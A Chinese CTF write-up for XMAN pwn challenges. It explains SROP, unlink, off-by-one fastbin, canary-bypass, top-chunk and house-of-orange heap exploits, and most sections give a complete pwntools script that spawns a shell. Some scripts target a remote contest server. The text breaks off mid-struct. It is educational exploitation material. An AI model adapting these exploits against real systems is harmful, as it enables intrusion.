# XMAN PWN部分wp

标签（空格分隔）： pwn

---
***1.smallest***
---

    start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
    .text:00000000004000B0                 xor     rax, rax
    .text:00000000004000B3                 mov     edx, 400h       ; count
    .text:00000000004000B8                 mov     rsi, rsp        ; buf
    .text:00000000004000BB                 mov     rdi, rax        ; fd
    .text:00000000004000BE                 syscall                 ; LINUX - sys_read
    .text:00000000004000C0                 retn
    .text:00000000004000C0 start           endp
考察的是srop
原理：
https://bestwing.me/2017/03/20/stack-overflow-three-SROP/
这里声明一个点，syscall和signal是两回事，syscall是指令，signal是一段函数，signal调用syscall而且封装context压栈，而syscall只会跳转执行系统函数，不会进行压栈，要区分好这个概念（我在这里混淆了两个概念卡了一晚上，一度怀疑自己智商）
sigreturn是一段指令，有弹栈操作。
基本知识就这样。
srop执行需要几个条件，分别是
第一，攻击者可以通过stack overflow等漏洞控制栈上的内容；
第二，需要知道栈的地址（比如需要知道自己构造的字符串/bin/sh的地址）；
第三，需要知道syscall指令在内存中的地址；
第四，需要知道sigreturn系统调用的内存地址。

在这里，第一个条件不用说，程序明显存在栈溢出漏洞（read），第三个条件syscall的指令在代码段有很清晰地呈现，第四个条件我们可以控制ax寄存器的值从而通过syscall来调用sigreturn。
那么第二个条件显然目前还不满足，但是我们可以通过泄露从而得到栈地址。
在64位系统下的调用约定是：
RAX-SYSCALl号,RDI,RSI,RDX,RCX,R8,R9
我们可以通过将rax的值设置为1，rdi值设置为1从而调用write系统调用把我们想泄露的地址打印在屏幕上
所以构造
payload：

    payload = proc_addr * 3

程序read到我们输入的字符串后，栈顶为三个程序开始地址，这样调用完read后又会返回到主程序，这时输入‘\xd3’,将程序原入口地址改为原入口地址加三，这样就跳过了xor ax，ax指令，且执行后read函数返回值为字符串长度1，这样我们就可以调用write系统调用从而将地址打印在屏幕上。
执行完write函数后我们又回到了主程序，这时我们就需要构造context而后执行sigreturn从而控制程序流程。
sigreturn系统调用号为15，所以大概思路是利用read函数控制ax寄存器而后进行syscall执行sigreturn。
但是要是想通过一次性达到同时满足控制eax值为15且执行execv（/bin/sh）是不现实的，所以需要两次构造context
第一次构造将程序返回至原程序入口，之后将我们控制的栈地址等信息写入context进而传入read函数，为下一步getshell做准备
第二次发送15字节的字符串，返回地址设置为syscall ret，调用sysreturn，将context内容加载
加载之后构造下一context，将执行getshell的运行条件写入context，返回地址设置为程序入口地址，而后将'/bin/sh'字符串写入预先设定好的位置，发送payload，之后再次发送syscall ret地址将返回地址设置为syscall ret同时将字符长度设置为15再次调用sysreturn加载构造好的context，执行execv('/bin/sh')getshell
exp(wiki)：```

    from pwn import *
    small = ELF('./smallest')
    sh = process('./smallest')
    context.arch = 'amd64'
    context.log_level = 'debug'
    syscall_ret = 0x00000000004000BE
    start_addr = 0x00000000004000B0
      
    payload = p64(start_addr) * 3
    sh.send(payload)


    sh.send('\xb3')
    stack_addr = u64(sh.recv()[8:16])
    log.success('leak stack addr :' + hex(stack_addr))


    sigframe = SigreturnFrame()
    sigframe.rax = constants.SYS_read
    sigframe.rdi = 0
    sigframe.rsi = stack_addr
    sigframe.rdx = 0x400
    sigframe.rsp = stack_addr
    sigframe.rip = syscall_ret
    payload = p64(start_addr) + 'a' * 8 + str(sigframe)
    sh.send(payload)


    sigreturn = p64(syscall_ret) + 'b' * 7
    sh.send(sigreturn)


    sigframe = SigreturnFrame()
    sigframe.rax = constants.SYS_execve
    sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
    sigframe.rsi = 0x0
    sigframe.rdx = 0x0
    sigframe.rsp = stack_addr
    sigframe.rip = syscall_ret
    
    frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
    print len(frame_payload)
    payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
    sh.send(payload)
    sh.send(sigreturn)
    sh.interactive()

***2.note***
经典的表单题目，丢进ida查看反编译代码：

    void __fastcall main(__int64 a1, char **a2, char **a3)
    {
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      alarm(0x3Cu);                                 // name adr in bss
      puts("Input your name:");                     // faze size 
      get_input((char *)&name, 64, 10);             // no off by one
      puts("Input your address:");
      get_input((char *)&addr, 96, 10);
      while ( 1 )
      {
        switch ( choices() )
        {
          case 1:
            add();                                  // nothing
            break;
          case 2:
            show();
            break;
          case 3:
            edit();                                 // suspect
            break;
          case 4:
            delete();                               // ptr has been nullified
            break;
          case 5:
            puts("Bye~");
            exit(0);
            return;
          case 6:
            exit(0);
            return;
          default:
            continue;
        }
      }
    }
漏洞点在于edit函数：

      strncat(&dest, addr_of_new_chunk + 15, 0xFFFFFFFFFFFFFFFFLL);// buffer overflow
      strcpy(ori_chunk_addr, &dest);
      free(addr_of_new_chunk);

可以看到在对dest进行strncat函数时，字符个数为FFFFFF，再次运行strcpy时会导致栈溢出，从而控制栈中参数
查看当前函数堆栈：
00000000000000D0 dest            dq ?                    ; offset
.
.
.
-0000000000000050 addr_of_new_chunk dq ?
这里可以看到，dest与addr_of_new_chunk的栈内地址相差0x80，我们可以对此地址进行控制，而后调用free函数再次申请则可以实现对目标地址的读写。
下一步我们要考虑伪造堆块，我们现在想要改写的地址是atoi函数的got表信息将其替换成system，atoi函数的地址可以查询（ida），于是我们考虑在存储堆地址信息的数组中构造堆块
（在这里为什么不直接写got表的原因是在got表附近我们不能直接构造出伪造的堆块，再次申请不能确定能够申请到伪造堆块进行改写）
存储信息的数组存储在bss段，在程序的开头我们可以发现在输入名字和地址时两者的信息存储在bss段，ida查看可知一下结构关系：
.bss:00000000006020E0 name            db    ? ;    
.
.
.
.bss:0000000000602120 ; char *base_of_heap_addr_list
于是我们可以构造大小为 0x30*padding+fake_chunk_head这样的名字来构造伪造堆块，并且在address处写入伪造的堆块头，绕过检查
这样再次申请内存就可以改写堆的地址，从而改写got表进而执行shell
exp：

    from pwn import *
    context.log_level = 'debug'
    p=process('./note')
    libc=ELF('/libc.so.6')
    
    def newnote(length,x):
        p.recvuntil('--->>')
        p.sendline('1')
        p.recvuntil(':')
        p.sendline(str(length))
        p.recvuntil(':')
        p.sendline(x)
    
    def editnote_append(id,x):
        p.recvuntil('--->>')
        p.sendline('3')
        p.recvuntil('id')
        p.sendline(str(id))
        p.recvuntil('append')
        p.sendline('2')
        p.recvuntil(':')
        p.sendline(x)
    
    def editnote_overwrite(id,x):
        p.recvuntil('--->>')
        p.sendline('3')
        p.recvuntil('id')
        p.sendline(str(id))
        p.recvuntil('append')
        p.sendline('1')
        p.recvuntil(':')
        p.sendline(x)
    
    def shownote(id):
        p.recvuntil('--->>')
        p.sendline('2')
        p.recvuntil('id')
        p.sendline(str(id))


    p.recvuntil('name:')
    p.sendline('A'*0x30+p64(0)+p64(0x70))
    p.recvuntil('address:')
    p.sendline(p64(0)+p64(0x70))
    newnote(0x80,0x60*'B')
    editnote_append(0,'C'*0x20+p64(0x602120))#ptr_addr
    atoi_got = 0x602088
    newnote(0x60,p64(atoi_got))
    gdb.attach(p)
    shownote(0)
    p.recvuntil('is ')
    atoi_addr = u64(p.recvline().strip('\n').ljust(8, '\x00'))
    atoi_libc=libc.symbols['atoi']
    sys_libc=libc.symbols['system']
    system=atoi_addr-atoi_libc+sys_libc
    print "system="+hex(system)
    
    editnote_overwrite(0,p64(system))
    p.recvuntil('--->>')
    p.sendline('/bin/sh')
    p.interactive()

***3.freenote***

    _QWORD *init_env()
    {
      _QWORD *ori_large_chunk; // rax
      _QWORD *result; // rax
      signed int i; // [rsp+Ch] [rbp-4h]
    
      ori_large_chunk = malloc(0x1810uLL);
      addr_of_ori_lc = (__int64)ori_large_chunk;
      *ori_large_chunk = 0x100LL;                   // max
      result = (_QWORD *)addr_of_ori_lc;
      *(_QWORD *)(addr_of_ori_lc + 8) = 0LL;        // count
      for ( i = 0; i <= 255; ++i )
      {
        *(_QWORD *)(addr_of_ori_lc + 24LL * i + 16) = 0LL;// used
        // len
        *(_QWORD *)(addr_of_ori_lc + 24LL * i + 24) = 0LL;
        result = (_QWORD *)(addr_of_ori_lc + 24LL * i + 32);// addr
        *result = 0LL;
      }
      return result;
    }
程序在执行时，首先执行此函数，申请了一个0x1810大小的堆块，用于保存后续的堆栈信息，各个字段的意义都注释标明
主要的漏洞函数是delete函数：

    int delete()
    {
      int v1; // [rsp+Ch] [rbp-4h]
    
      if ( *(_QWORD *)(addr_of_ori_lc + 8) <= 0LL )
        return puts("No notes yet.");
      printf("Note number: ");
      v1 = get_input();
      if ( v1 < 0 || (signed __int64)v1 >= *(_QWORD *)addr_of_ori_lc )
        return puts("Invalid number!");
      --*(_QWORD *)(addr_of_ori_lc + 8);
      *(_QWORD *)(addr_of_ori_lc + 24LL * v1 + 16) = 0LL;
      *(_QWORD *)(addr_of_ori_lc + 24LL * v1 + 24) = 0LL;
      free(*(void **)(addr_of_ori_lc + 24LL * v1 + 32));// ptr not nullified
      return puts("Done.");
    }
可以看到free指针后没有将指针信息清零，这就为后续的unlink提供了利用条件
第二个漏洞函数：

    __int64 __fastcall leak_function(__int64 a1, signed int a2)
    {
      signed int i; // [rsp+18h] [rbp-8h]
      int v4; // [rsp+1Ch] [rbp-4h]
    
      if ( a2 <= 0 )
        return 0LL;
      for ( i = 0; i < a2; i += v4 )
      {
        v4 = read(0, (void *)(a1 + i), a2 - i);
        if ( v4 <= 0 )
          break;
      }                                             // no \x00 appended
                                                    // 
      return (unsigned int)i;
    }
可以看到没有在输入字符串结尾添加\x00，可以泄露地址或者其他信息
第一步-leakaddr：
申请两个堆块，free掉第二个，这时此块被分配到了unsortedbin之中，他的fd，bk指针指向的是main_arena的unsortedbin头部地址，这样再次申请一个堆块，使其内容将fd指针信息覆盖，调用show则可以泄露出地址，进而通过计算算出libc基地址
这里可以leak出main_arena+88的地址，我们在gdb调试时输入vmmap就可以查看到libc地址，（后缀名为libc且权限是可读可执行，start地址），把泄露出的地址相减就可以得到偏移
这里申请两个堆块的原因是如果申请一个堆块的话free之后会被topchunk合并。
第二步-泄露heap基地址
同样的，我们申请四个堆块，free掉不相邻的两个堆块（0和2），这时由于unsortedbin是双向链表，他们的fd，bk指针就分别存储着以下信息
0：fd->unsorted_bin_head bk->chunk_2_addr
2:bk->unsorted_bin_head fd->chunk_0_addr
与上一步同样的套路，泄露出heap地址

第三步-unlink
首先申请三个堆块而后free掉，这样就在保存堆信息的结构体数组中保留了指针，而后构造伪造堆块payload
p64(0)+p64(0x81)+fd+bk+padding(len = 0x80-0x20)+
p64(0x80)+p64(0x90)+padding(0x80)+
p64(0)+p64(0x91)+padding(0x80)
即在第一个堆块内伪造一个小于原第一堆块的fake块，其大小为原堆块减去头部的大小，且将preinuse位置1，在其中加入fd，bk
第二个堆块伪造成正在使用的堆块，preinuse位值0
第三个堆块的preinuse位置1
这样就保证了在结构体数组中的堆块指针指向我们伪造的第二个堆块，调用free函数free掉第二个堆块就会触发unlink函数
在这里
fd = victim - 0x18
bk = victim - 0x10
这样执行unlink之后就会使
victim---->fd
即victim指针指向的地址的值为fd即victim-0x18，进而达到修改其自身的效果
我们指定的victim是chunk0，由于我们已经得到了heap地址，经过计算就可以得到fd和bk的值
之后调用edit函数，修改chunk0，由于chunk0指针已经被修改，所以其实就是修改结构体数组中的数据，即我们可以读或者写的地址
构造的payload为：
count（0<count<max)+flag+len+got_free+padding(len 0x10)+binsh_addr
这样我们就可以修改free_got的地址，再次调用edit，将got表改写成system地址，执行free（1）操作，即free(binsh_addr)->system(binsh_addr)->system(binsh)即可getshell

    from pwn import *
    context.log_level = 'debug'
    io = process('./freenote')
    elf = ELF('freenote')
    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    def show(idx):
    	io.recvuntil('choice: ')
    	io.sendline('1')
    
    	io.sendline(str(idx))
    def add(len,content):
    	io.recvuntil(':')
    	io.sendline('2')
    	io.recvuntil('note:')
    	io.sendline(str(len))
    	io.recvuntil(':')
    	io.sendline(content)
    def delete(idx):
    	io.recvuntil(':')
    	io.sendline('4')
    	io.recvuntil('number:')
    	io.sendline(str(idx))
    def edit(idx,len,content):
    	io.recvuntil(':')
    	io.sendline('3')
    	io.recvuntil('number:')
    	io.sendline(str(idx))
    	io.recvuntil(':')
    	io.sendline(str(len))
    	io.recvuntil(':')
    	io.sendline(content)
    
    add(0x80,'A'*0x80)
    add(0x80,'B'*0x80)
    delete(0)
    add(0x8,'A'*0x8)
    show(0)
    io.recvuntil("0. ")
    leak = io.recvuntil("\n")
    print type(leak)
    print leak[8:-1].encode('hex')
    leaklibcaddr = u64(leak[8:-1].ljust(8, '\x00'))
    print hex(leaklibcaddr)
    
    delete(1)
    delete(0)
    magic_num = 0x3c4b78
    libc_base = leaklibcaddr - magic_num
    system_addr = libc_base+libc.symbols['system']
    binsh = libc_base + next(libc.search('/bin/sh'))
    
    add(0x80,"A"*0x80)
    add(0x80,'B'*0x80)
    add(0x80,'C'*0x80)
    add(0x80,'D'*0x80)
    delete(2)
    delete(0)
    
    add(0x8,'A'*8)
    gdb.attach(io)
    show(0)
    io.recvuntil("0. ")
    leak = io.recvuntil("\n")
    print type(leak)
    print leak
    print leak[8:-1].encode('hex')
    leak_heap= u64(leak[8:-1].ljust(8, '\x00'))
    print leak_heap


    delete(0)
    delete(1)
    delete(3)
    #gdb.attach(io)
    
    fd = leak_heap - 0x1808 
    bk = fd + 0x8
    
    add(0x80,'A'*0x80)
    add(0x80,'B'*0x80)
    add(0x80,'C'*0x80)
    
    delete(2)
    delete(1)
    delete(0)
    
    notelen = 0x80
    free_got = 0x602018


    payload  = ""
    payload += p64(0x0) + p64(notelen+1) + p64(fd) + p64(bk) + "A" * (notelen - 0x20)
    payload += p64(notelen) + p64(notelen+0x10) + "A" * notelen
    payload += p64(0) + p64(notelen+0x11)+ "\x00" * (notelen-0x20)
    
    add(len(payload),payload)
    delete(1)
    
    payload2 = p64(notelen) + p64(1) + p64(0x8) + p64(free_got) + "A"*16 + p64(binsh)
    payload2 += "A"* (notelen*3-len(payload2)) 
    
    edit(0,len(payload2),payload2)
    gdb.attach(io)
    edit(0,0x8,p64(system_addr))
    gdb.attach(io)
    delete(1)
    io.interactive()


***4.offbyone***
标准的表单输入程序，漏洞点在edit函数：

    unsigned __int64 edit()
    {
      __int64 idx; // [rsp-18h] [rbp-18h]
      unsigned __int64 v2; // [rsp-10h] [rbp-10h]
    
      v2 = __readfsqword(0x28u);
      printf("index: ");
      __isoc99_scanf("%d", &idx);
      if ( (signed int)idx >= 0 && (signed int)idx <= 15 && addr_list[(signed int)idx] )
      {
        puts("your note:");
        HIDWORD(idx) = strlen(addr_list[(signed int)idx]);
        read(0, (void *)addr_list[(signed int)idx], SHIDWORD(idx));
        puts("done.");
      }
      else
      {
        puts("invalid index.");
      }
      return __readfsqword(0x28u) ^ v2;
    }
strlen在读取字符串长度时以0作为结尾，在读取时会将下一堆块的头部结尾字段当作字符读取，造成了一个字节的溢出
思路大概就是leak地址，overlap堆块，改写函数地址，getshell
首先申请4个堆块，除了第二个堆块外其他堆块都要在fastbin大小范围内，为后续的fastbinattack做准备
由于我们要利用offbyone来进行对头部size字段的改写，那么我们要实施攻击的目标块附近堆块申请的堆块大小应该是形如0x x8的，这样才能对下一个堆块的presize位进行复用，进而offbyone修改size位
申请的堆块布局如下

    0x28(实际堆块大小  0x30）
    0xf8             0x100
    0x68             0x70
    0x60             0x70
    0x60             0x70

这样我们free掉1块，被放入unsortedbin中，通过修改0块内容溢出字节修改1号堆块size大小为171，再通过修改2号堆块内容将3号堆块的头部presize字段修改为0x170，size字段不变
这样我们申请一个大小为0xf8大小的堆块时系统会将unsortedbin中的1号块分割（因为我们已经把其大小改成了0x170，使其覆盖了2号堆块，三号堆块的头部信息也同样修改满足bypass检查需求），将原来的1号堆块分配给用户，而将原来的2号堆块（分割后剩余部分）放回unsortedbin中，并且其fdbk指针是main_arena+88这一地址（unsortedbin头部信息）。
这样我们show一下2的话就可以泄露地址了。
这时我们再申请一个大小为0x60的堆块，系统会把2号堆块返回给用户，这样我们就有2号和5号堆块其实是一块内存这一攻击条件。
这时我们需要利用fastbinattack来进行攻击
我们有可以释放后再写入信息的堆块（2、5号堆块），我们先释放3号堆块然后在释放2号堆块，这时fastbin->2->3,而后我们将2号堆块的fd指针改写（因为我们可以对五号堆块读写，而5和2其实是一块堆块），改写成我们想要修改数据的相应位置，这时fastbin->2->victim,而后申请一个堆块没什么用，再次申请堆块即可修改数据。
这里需要指明一点的是，由于在free堆块时相应的指针被清零，所以我们选择了一个比较巧妙地方法：
改写malloc_hook,系统检查堆块时报错函数malloc_printer会调用malloc，而我们在调用malloc时会首先检查malloc\_hook的值，如果有的话就首先调用malloc\_hook,也就是说我们故意的让系统检测到不合法的操作信息使其报错，而后使其调用malloc_hook,我们在mallochook中写入onegadget地址，这样就可以getshell。
exp：

    from pwn import *
    def add(size,note):
    	p.sendlineafter(">> ","1")
    	p.sendlineafter(": ",str(size))
    	p.sendlineafter("note:",note)
    
    def edit(index,note):
    	p.sendlineafter(">> ","2")
    	p.sendlineafter("index: ",str(index))
    	p.sendafter("note:",note)
    
    def delete(index):
    	p.sendlineafter(">> ","3")
    	p.sendlineafter("index: ",str(index))
    
    def show(index):
    	p.sendlineafter(">> ","4")
    	p.sendlineafter("index: ",str(index))


​    
​    
    #libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc=ELF('libc.so.6')
    #p=process('./offbyone')
    p = remote('202.112.51.184' ,19006)
    
    add(0x28,'A'*0x28)#0
    add(0xf8,'B'*0xf8)#1
    add(0x68,'C'*0x68)#2
    add(0x60,'D'*0x60)#3
    add(0x60,'E'*0x60)#4
    
    #raw_input()
    delete(1)
    edit(0,'A'*0x28+'\x71')
    #gdb.attach(p)
    edit(2,'C'*0x60+p64(0x170)+'\x70') #bypass check
    									#enlarge 1 and set fakehead of 3
    									#make it like 1 and 2 is one chunk
    
    add(0xf8,'F'*0xf8)					#it lays in 1


    show(2)								#2 now in unsorted bin because fake chunk is too large
    									#so it split into two chunk
    main_arena=u64(p.recvline(keepends=False).ljust(8,'\0'))-0x58
    print hex(main_arena)
    
    libc_base=main_arena-libc.symbols['__malloc_hook']-0x10
    print hex(libc_base)
    free_got = libc_base + libc.symbols['free']
    system=libc_base+libc.symbols['system']
    print "system",hex(system)


    malloc_hook=libc_base+libc.symbols['__malloc_hook']


    one_gadget=libc_base+0xf02a4# 0x4647c 0xe9415 0x46428 0xea36d
    #one_gadget=libc_base+0x4647c
    
    add(0x60,'Z'*0x60)#5 == 2		now 2 is used
    
    delete(3)
    					#fastbin:2->3
    delete(2)
    #gdb.attach(p)
    edit(5,p64(malloc_hook-0x10-3)[0:6]) #2->mlhk
    #edit(5,p64(libc.symbols['free'])[0:6])
    add(0x60,'/bin/sh\x00'+'a'*0x58)#2contentchanged


    add(0x60,'a'*0x3+p64(one_gadget))#change malloc hook to onegadget
    #add(0x60,p64(system))
    delete(2)#doublefree call error->mallocprint->mallochook->onegadget->shell
    delete(5)
    
    p.interactive()

这里需要注意的是，我们在利用fd指针寻找伪造堆块时，要保证堆块的头部信息也就是size字段要与申请的大小相同，在malloc附近由于未初始化都是0，借助上一个地址的信息我们可以得到我们需要的大小，也就是说我们修改的地址是在malloc_hook - 0x10 -3的位置（可以自己手动调试），libc的版本不同的话我们构造的head大小也不同。
同样需要提及的一点是onegadget需要一些条件的满足，我们需要逐个尝试才能保证其准确性。

***5.canary***
程序开了canary和nx
这道题主要就是考察如何泄露或者改写canary
归根结底就是怎么在内存里面找到canary

    pthread_create(&newthread, 0LL, (void *(*)(void *))start_routine, 0LL);
程序在执行时创建了一个线程
创建线程时会把tls保存到栈中，并且canary是在最前边，这样我们就可以将程序返回时canary的值和原本的canaryde值覆盖使其相等，就可以绕过检查
查看canary的方式就是在检查canary的汇编代码地址附近下断点，这样可以在栈里面看到canary的值，而后在内存里查找与其相同的值，将两个值得地址减一下就得到偏移了
exp：

    from pwn import *
    import os
    context.log_level = 'debug'
    #env = {'LD_PRELOAD': os.path.join(os.getcwd(),'./libc.so.6')}#-56d992a0342a67a887b8dcaae381d2cc51205253')}
    #io = remote('202.112.51.184' ,19003)
    io = process('./bs')
    elf = ELF('bs')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF('libc.so.6')
    main=0x4009e7
    poprdi=0x400c03
    poprsi=0x400c01
    read=0x4007e0
    atoigot=0x601ff0
    putsgot=0x601fb0
    putplt=0x4007c0
    buf=0x602f00
    leave=0x400955
    p1=p64(poprdi)+p64(putsgot)+p64(putplt)
    p2=p64(poprdi)+p64(0)+p64(poprsi)+p64(buf+0x8)+p64(0)+p64(read)+p64(leave)
    payload=p1+p2
    io.recvuntil("How many bytes do you want to send?")
    io.sendline(str(6128))
    log.success(hex(libc.symbols['puts']))
    io.send("\x00"*4112+p64(buf)+payload+"\x00"*(0x17f0-4120-len(payload)))
    io.recvuntil("It's time to say goodbye.\n")
    libbase=u64(io.recv()[:6]+"\x00\x00")-0x6f690
    print hex(libbase)
    one = 0xf02a4 + libbase
    gdb.attach(io)
    raw_input()
    io.sendline(p64(one))
    io.interactive()

***7.top_chunk_attack***
源程序漏洞很多。。主要是在delete函数，只是把堆块free掉其他的什么也没干：

    int delete()
    {
      unsigned __int64 v1; // [rsp+8h] [rbp-8h]
    
      puts("Please enter the index of the note:");
      v1 = getnum();
      if ( !*((_QWORD *)&len_list + 2 * v1) )
        return puts("There's nothing here!");
      free(ptrlist[2 * v1]);                        // not nullified
                                                    // len still and ptr still
      return puts("Delete completion!");
    }
但是这个程序会对输入的字符检查，凡是在libc范围内的地址都会被过滤

    signed __int64 __fastcall sub_1052(__int64 a1, unsigned __int64 a2)
    {
      unsigned __int64 v2; // rax
      __int64 v4; // [rsp+18h] [rbp-18h]
      int j; // [rsp+28h] [rbp-8h]
      int i; // [rsp+2Ch] [rbp-4h]
    
      v2 = 8LL;
      if ( a2 <= 8 )
        v2 = a2;
      for ( i = 0; i < v2; ++i )
      {
        v4 = i + a1;
        for ( j = 0; j < (a2 - i + 7) >> 3; ++j )
        {
          if ( *(_QWORD *)(8LL * j + v4) > (unsigned __int64)filtdsk
            && *(_QWORD *)(8LL * j + v4) < (unsigned __int64)qword_2030D8 )
          {
            return 0xFFFFFFFFLL;
          }
        }
      }
      return 0LL;
    }
所以不能输入libc内的地址，常规的改写地址的方式行不通
这样就只能实行topchunkattack
主要思路就是通过fastbinattack改写topchunk头部大小（注意要构造bypass条件，如堆块头大小以及当前fastbin是否在其所属大小的链中）
而后
system+free_hook-top_ptr 
之后 malloc(free_hook-top_ptr-0x10)  ,这时肯定会用top chunk进行分配。
则分配过后，新的top chunk的size为
原来的size - 分配掉的size = （system+free_hook-top_ptr) - (free_hook-top_ptr-0x10 +0x10)
= system
新的top chunk指针位于
原top chunk地址 + 分配掉的size = top_ptr + （free_hook-top_ptr-0x10+0x10） = free_hook
这样就在不写入libc地址的情况下在free_hook的地方写入了system地址。
值得注意的一点是：
实际分配的时候还需要考虑到计算size的对齐问题等，所以可以在上面
写入的值附近试一试，保证最后可以在free_hook写入system（实际上是system+1，因为
topchunk的P标志位会被设为1）地址就行。
于是乎需要手动调试或者其他技巧搞到一个符合的组合
exp：

    from pwn import *
    import os
    
    context.log_level = 'debug'
    env = {'LD_PRELOAD':'./libc.so.6'}
    io = process('./pwn2',env=env)
    #io = remote('202.112.51.184',19007)
    elf = ELF('pwn2')
    libc = ELF('/libc.so.6')
    
    def add(size,content):
    	io.recvuntil('>>',timeout = 1)
    	io.sendline('1')
    	io.recvuntil('Please enter the length of the note:',timeout = 1)
    	io.sendline(str(size))
    	io.recvuntil('Please enter the data of the note:',timeout = 1)
    	io.sendline(content)
    def edit(idx,content):
    	io.recvuntil('>>')
    	io.sendline('2')
    	io.recvuntil('Please enter the index of the note:')
    	io.sendline(str(idx))
    	io.recvuntil('Please enter the data of the note:')
    	io.sendline(content)
    def delete(idx):
    	io.recvuntil('>>')
    	io.sendline('3')
    	io.recvuntil('Please enter the index of the note:')
    	io.sendline(str(idx))
    def show():
    	io.recvuntil('>>')
    	io.sendline('4')
    
    add(0x100,'A'*0x100)#0
    add(0x30,"B"*0x30)#1
    delete(0)
    #gdb.attach(io)
    show()
    io.recvuntil('note index 0 : ')
    leak = u64(io.recvuntil('1. allocate note')[0:6]+'\x00\x00')
    print hex(leak)
    libc_base = leak -0x58 - libc.symbols['__malloc_hook']-0x10
    log.success(hex(libc_base))
    free_hook = libc_base + libc.symbols['__free_hook']
    system_addr = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search('/bin/sh'))
    
    add(0x100,'A'*0x100)#2
    add(0x30,'C'*0x30)#3
    add(0x30,'D'*0x30)#4
    add(0x30,'E'*0x30)#5
    delete(3)
    delete(4)
    show()
    io.recvuntil('note index 4 : ')
    leak_heap = u64(io.recvuntil('1. allocate note')[0:6]+'\x00\x00')
    top_addr = leak_heap + 0xc0
    log.success(hex(top_addr))
    fake_size = system_addr+free_hook-top_addr
    log.success(fake_size)
    edit(5,'E'*0x20+p64(0x30)+p64(0x40))
    
    #gdb.attach(io)
    edit(4,p64(top_addr-0x10)+'\n')
    add(0x30,'/bin/sh\x00')#6
    
    add(0x30,p64(0xdeadbeef)+p64(fake_size-1))
    
    #gdb.attach(io)
    
    add(free_hook-top_addr-0x10,'F'*0x10)#7
    
    delete(6)
    #gdb.attach(io)
    io.interactive()

***8.houseoforange***
由于最近做到了一道很恶心的题目，导致我对于堆的一些理解认知产生了怀疑。于是决定补习一下一些堆的高级利用方法
题目来自于pwnable.tw的bookwriter
源程序是很典型的表单程序，唯一的特殊之处在于没有free函数，所以利用方式不同于以往
漏洞点有以下几个地方：
1.author变量与存储堆地址的指针列表相连，在我们打印出author信息的时候会将堆地址泄露

    bss:0000000000602060 author          db    ? ;
    .
    .
    .
    bss:00000000006020A0 addrlist        db ?

2.add函数对于下标的检查有误

     for ( i = 0; ; ++i )                          // max 8
      {
        if ( i > 8 )
          return puts("You can't add new page anymore!");
        if ( !addrlist[i] )
          break;
      }

我们在可以看见下标可以为8，而addrlist大小为8，这就意味着我们可以多输入一个page，数组越界。

    bss:00000000006020A0 addrlist        db ? 
    .
    .
    .
    bss:00000000006020E0 lenlist         dq ?     
这样我们就可以把page[0]的长度改写为一个堆地址值，这样在我们edit的时候就可以利用他的长度来覆写之后的堆块信息，也就是堆溢出。
3.input函数对于字符串的处理

    __int64 __fastcall get_input(__int64 ptr, unsigned int len)
    {
      unsigned int v3; // [rsp+1Ch] [rbp-4h]
    
      v3 = _read_chk(0LL, ptr, len, len);
      if ( (v3 & 0x80000000) != 0 )
      {
        puts("read error");
        exit(1);
      }
      if ( *(_BYTE *)((signed int)v3 - 1LL + ptr) == '\n' )// no \x00 leak
        *(_BYTE *)((signed int)v3 - 1LL + ptr) = 0;
      return v3;
    }
这里可以看到，如果我们输入的字符串长度为len的话，结尾不会以\x00做截断，这样就会导致leak
（他只是判断了最后一位是否为\n，如果是的话就换成0）
4.edit函数

    int edit()
    {
      unsigned int v1; // [rsp+Ch] [rbp-4h]
    
      printf("Index of page :");
      v1 = input_pus();
      if ( v1 > 7 )
      {
        puts("out of page:");
        exit(0);
      }
      if ( !addrlist[v1] )
        return puts("Not found !");
      printf("Content:");
      get_input((__int64)addrlist[v1], lenlist[v1]);
      lenlist[v1] = strlen(addrlist[v1]);
      return puts("Done !");
    }
可以看到每次edit都会更新长度列表中的值，而strlen是以0作为截断，在上面的getinput函数中会明显发现当输入长度为len时不会加入0截断，这样我们就可以把下一个相邻堆块的头部读入算入长度，进一步的，我们就可以改写下一个堆块的size字段

漏洞利用的一些前置知识：
topchunk size小于申请大小, top chunk 加入unsorted bin中, 系统重新分配一块top chunk. 
首次加入unsorted bin的chunk块, 若再次使用此chunk, glibc会将其先加入对应small　bin中, 再从small bin取出使用, 剩余的加入到unsorted bin中. 
FSOP是FILE Stream Oriented Programming的缩写, 进程内所有的_IO_FILE结构会使用_chain域相互连接成一个链表, 这个链表的头部由_IO_list_all维护. 
FSOP的核心思想就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项, 但是单纯的伪造只是伪造了数据还需要某种方法进行触发. 

这些基本就是本题目的一些基本思想

首先我们需要改写topchunk的size字段，使其缩小，但是我们需要考虑一些关于页面对齐以及其他的一些因素，这里引用了天舒的一句话：

    1.top_chunk_size>MINSIZE(MINISIZE)没有查到是多少，反正不要太小都行
    2.top_chunk需要有pre_in_use位置1
    3.top_chunk需要和原来的堆页在一个页上，说白了就是原先top chunk的size最高位置0，比如原来size为0x20fa0，应修改为0xfa0。

根据以上的准则改写topchunk大小之后，会触发一些操作：
topchunk size小于申请大小, top chunk 加入unsorted bin中, 系统重新分配一块top chunk. 
这样在unsortedbin中我们就有了原先的topchunk，以后的每次分配只要大小小于此chunk的话就会使其分割而后分配，这样我们申请一个大小小于此chunk大小的堆块时其原有的bk指针会保留，进一步就leak出了libc地址

而后由于我们在伪造file结构时需要在堆中伪造，但是我们并不知道其地址，这里我们就可以把author输入为0x40的字符串，进一步查看author时就可以泄露出heap地址

有了heap地址之后我们通过下标溢出将page[0]的大小设置为一个值很大的地址，这样我们就可以通过编辑page[0]来构造伪造的file结构

这里涉及到了一些很巧妙地操作
首先我们利用unsorted bin attack将io_list_all的地址修改为unsorted bin的地址
这里列一下iofile的文件结构：

    struct _IO_FILE {
      int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
    #define _IO_file_flags _flags
    
      /* The following pointers correspond to the C++ streambuf protocol. */
      /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
